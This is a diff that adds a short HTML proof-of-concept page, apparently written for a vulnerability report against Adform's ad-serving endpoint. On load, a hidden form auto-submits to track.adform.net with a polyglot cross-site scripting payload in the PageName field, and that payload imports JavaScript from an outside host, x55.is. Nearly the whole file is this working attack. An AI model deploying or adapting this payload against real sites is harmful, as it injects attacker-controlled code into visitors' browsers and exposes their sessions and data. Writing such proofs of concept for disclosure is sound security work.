@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto XSS PoC</title>
+</head>
+<body>
+  <h1>Auto XSS Trigger via Adform</h1>
+  <p>This PoC automatically triggers the XSS when the page loads.</p>
+
+  <!-- Hidden form that will submit automatically -->
+  <form id="xssForm" method="GET" action="https://track.adform.net/serving/container/">
+    <input type="hidden" name="pm" value="1429392">
+    <input type="hidden" name="lid" value="95143632">
+    <input type="hidden" name="PageName" value="1'/*\'/*&quot;/*&quot;/*</Script/--><Input/AutoFocus/OnFocus=/**/(import('https://x55.is?1=14833'.source))//>">
+  </form>
+
+  <script>
+    document.getElementById("xssForm").submit();
+  </script>
+</body>
+</html>
